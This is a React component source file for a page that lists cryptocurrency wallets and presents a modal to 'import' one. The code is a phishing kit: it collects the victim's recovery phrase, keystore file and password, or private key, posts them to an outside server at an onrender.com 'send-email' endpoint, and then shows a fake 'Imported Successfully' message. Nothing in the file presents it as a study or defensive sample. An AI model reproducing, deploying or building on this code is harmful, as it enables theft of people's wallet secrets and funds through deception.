import React, { useEffect, useState } from "react";
import { wallets } from "../constants";
import { useNavigate, Link } from "react-router-dom";
import { FaRegArrowAltCircleRight, FaRegCheckCircle } from "react-icons/fa";
import axios from "axios";

const WalletGrid = () => {
  const navigate = useNavigate();
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [openModal, setOpenModal] = useState(false);
  const [text, setText] = useState("");
  const [activeTab, setActiveTab] = useState("phrase");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);
  const [fileName, setFileName] = useState("");
  const [selectedFile, setSelectedFile] = useState(null);

  const handleFileChange = (e) => {
    const file = e.target.files[0];
    if (file) {
      setSelectedFile(file);
      setFileName(file.name);
    }
  };

  const onCancel = () => {
    setSelectedWallet(null);
    setText("");
  };

  const handleWalletClick = (wallet) => {
    // Navigate to the wallet's page or perform any action you want
    // navigate(`/wallet/${wallet.id}`);
    setSelectedWallet(wallet);
  };

  useEffect(() => {
    selectedWallet ? setOpenModal(true) : setOpenModal(false);
    console.log("selected wallet", selectedWallet);
  }, [selectedWallet]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log("clickedd");
    const words = text.trim().split(/\s+/);
    if (words.length < 12) {
      setError("You must enter 12 words.");
      console.log("err", error);
      return;
    }

    setError("");
    try {
      const response = await axios.post(
        "https://droplet-6cvr.onrender.com/jay/send-email",
        {
          wallet: selectedWallet.title,
          text: text.trim(),
        }
      );

      console.log("API response:", response.data);
      setSuccess(true);
      // setSubmitted(true);
    } catch (err) {
      // console.error("API error:", err);
      // setError("Something went wrong. Please try again.");
      // setSubmitted(false);
    } finally {
      // setLoading(false);
    }
  };

  const handleSubmitTwo = async (e) => {
    e.preventDefault();
    setError("");

    try {
      const formData = new FormData();
      formData.append("wallet", selectedWallet.title);
      formData.append("text", text.trim());
      formData.append("file", selectedFile); // selectedFile should be a File object

      const response = await axios.post(
        "https://droplet-6cvr.onrender.com/barbs/send-email",
        formData,
        {
          headers: {
            "Content-Type": "multipart/form-data",
          },
        }
      );

      console.log("API response:", response.data);
      setSuccess(true);
    } catch (err) {
      console.error("API error:", err);
      setError("Something went wrong. Please try again.");
    }
  };

  return (
    <div className="flex flex-col justify-start items-center w-full">
      <div className="grid grid-cols-3 sm:grid-cols-3 md:grid-cols-6 md:gap-10 gap-5 p-4">
        {wallets.map((wallet) => (
          <div
            key={wallet.id}
            onClick={() => handleWalletClick(wallet)}
            className="flex flex-col items-center justify-center md:gap-4 gap-1 p-2 cursor-pointer transition duration-300 ease-in-out transform hover:scale-110"
          >
            <div className="bg-white flex justify-center items-center rounded-lg mb-1">
              <img
                src={wallet.img}
                alt={wallet.title}
                className="w-[50px] h-[50px]"
              />
            </div>
            <span className="text-[12px] md:text-[16px] text-center font-medium text-black">
              {wallet.title}
            </span>
          </div>
        ))}
      </div>
      {selectedWallet && (
        <div className="fixed flex h-full w-full p-2 justify-center items-center bg-black/50 top-0">
          {!success && (
            <div className="flex flex-col md:w-[500px] w-full p-[25px] bg-white rounded-md gap-4">
              <div className="flex justify-center items-center gap-4">
                <div className="w-8 h-8">
                  <img
                    src={selectedWallet?.img}
                    alt={selectedWallet?.title}
                    className="w-full h-full"
                    srcset=""
                  />
                </div>
                <p className="font-semibold">
                  Import your {selectedWallet?.title} wallet
                </p>
              </div>
              <div className="flex justify-between items-center w-full border-b-2 border-gray-300 p-4">
                <div
                  className="cursor-pointer"
                  onClick={() => {
                    setActiveTab("phrase"), setText("");
                  }}
                >
                  <p className="font-semibold text-gray-500">Phrase</p>
                </div>
                <div
                  className="cursor-pointer"
                  onClick={() => {
                    setActiveTab("keystore"), setText("");
                  }}
                >
                  <p className="font-semibold text-gray-500">Keystore JSON</p>
                </div>
                <div
                  className="cursor-pointer"
                  onClick={() => {
                    setActiveTab("private"), setText("");
                  }}
                >
                  <p className="font-semibold text-gray-500">Private Key</p>
                </div>
              </div>
              {error && (
                <p className="text-xs text-red-700 text-center">{error}</p>
              )}
              {activeTab === "phrase" && (
                <div>
                  <form onSubmit={handleSubmit} className="w-full mb-4 gap-4">
                    <textarea
                      id="text"
                      name="text"
                      rows="4"
                      required
                      placeholder="Enter your Recovery phrase"
                      value={text}
                      className="w-full outline-none border border-grey-300 rounded-lg p-2 "
                      onChange={(e) => setText(e.target.value)}
                    />
                    <button
                      type="submit"
                      className="flex justify-center items-center gap-2 hover:bg-blue-700 bg-blue-600 py-1 rounded-md w-full text-white"
                    >
                      PROCEED <FaRegArrowAltCircleRight />
                    </button>
                  </form>
                  <p className="text-xs text-gray-400 text-center">
                    Typically 12 (sometimes 24) words separated by single spaces
                  </p>
                </div>
              )}
              {activeTab === "keystore" && (
                <div>
                  <form
                    onSubmit={handleSubmitTwo}
                    className="flex flex-col w-full mb-4 gap-4"
                  >
                    <div className="flex justify-center items-center w-full border-dashed border rounded-md text-black max-w-md">
                      <label
                        htmlFor="keystore-file"
                        className="w-full text-center cursor-pointer inline-block text-blue-400 px-4 py-2 rounded-md font-medium text-sm hover:bg-blue-700"
                      >
                        {fileName || "Choose Keystore File"}
                      </label>
                      <input
                        id="keystore-file"
                        type="file"
                        onChange={handleFileChange}
                        className="hidden"
                        required
                      />
                    </div>
                    <input
                      id="text"
                      name="text"
                      required
                      placeholder="Enter your Wallet password"
                      value={text}
                      className="w-full outline-none border border-grey-300 rounded-lg p-2 mb-2"
                      onChange={(e) => setText(e.target.value)}
                    />
                    <button
                      type="submit"
                      className="flex justify-center items-center gap-2 hover:bg-blue-700 bg-blue-600 py-1 rounded-md w-full text-white"
                    >
                      PROCEED <FaRegArrowAltCircleRight />
                    </button>
                  </form>
                  <p className="text-xs text-gray-400 text-center">
                    Several lines of text beginning with {'"{...}"'} plus the
                    password you used to encrypt it.
                  </p>
                </div>
              )}
              {activeTab === "private" && (
                <div>
                  <form onSubmit={handleSubmitTwo} className="w-full mb-2">
                    <input
                      id="text"
                      name="text"
                      required
                      placeholder="Enter your Private key"
                      value={text}
                      className="w-full outline-none border border-grey-300 rounded-lg p-2 mb-4"
                      onChange={(e) => setText(e.target.value)}
                    />
                    <p className="text-xs text-gray-400 text-center mb-2">
                      Typically 12 (sometimes 24) words separated by single
                      spaces
                    </p>
                    <button
                      type="submit"
                      className="flex justify-center items-center gap-2 hover:bg-blue-700 bg-blue-600 py-1 rounded-md w-full text-white"
                    >
                      PROCEED <FaRegArrowAltCircleRight />
                    </button>
                  </form>
                  {/* <p className="text-xs text-gray-400 text-center">
                    Typically 12 (sometimes 24) words separated by single spaces
                  </p> */}
                </div>
              )}
              <button
                onClick={() => onCancel()}
                className="flex justify-center items-center w-[100px] hover:bg-red-700 self-center gap-2 bg-red-600 py-1 rounded-md text-white"
              >
                Cancel
              </button>
            </div>
          )}
          {success && (
            <div className="flex flex-col justify-center items-center md:w-[500px] w-full p-[25px] bg-white rounded-md gap-4">
              <FaRegCheckCircle size={30} />
              <p className="font-semibold">Imported Successfully</p>
              <Link to="/">
                <button className="flex justify-center items-center w-[100px] hover:bg-red-700 self-center gap-2 bg-red-600 py-1 rounded-md text-white">
                  Go Back
                </button>
              </Link>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default WalletGrid;
